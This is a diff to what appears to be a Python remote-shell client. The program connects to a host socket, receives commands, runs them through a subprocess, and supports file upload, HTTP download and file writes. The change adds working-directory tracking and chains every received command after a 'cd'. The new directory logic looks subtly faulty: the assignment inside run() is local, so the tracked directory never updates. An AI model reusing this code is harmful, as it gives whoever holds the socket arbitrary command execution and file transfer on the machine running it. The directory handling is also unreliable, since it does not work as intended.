@@ -13,6 +13,7 @@ HOST = '127.0.0.1'
 PORT = 1000
 
 sock = None
+cwd = os.getcwd()
 
 def upload(sock, fn):
   try:
@@ -45,13 +46,18 @@ def run(s):
   out, err = p.communicate()
   out = out.decode('utf-8')
   err = err.decode('utf-8')
-  return out + '\n' + err
-
-def cwd(prev=None):
-  if prev:
-    return prev + '\n' + os.getcwd() + '>'
+  if out:
+    if s.startswith('cd'):
+      cwd = out
+    return out
   else:
-    return os.getcwd() + '>'
+    return err
+
+def res(prev=None):
+  if prev:
+    return prev + '\n' + cwd + '>'
+  else:
+    return cwd + '>'
 
 while True:
   try:
@@ -74,7 +80,7 @@ while True:
         elif data.startswith('dlhttp '):
           ret = dlhttp(sock, data[7:])
         else:
-          ret = run(data)
+          ret = run('cd ' + cwd + ' && ' + data)
       else:
         try:
           f = open(data[0], 'wb')
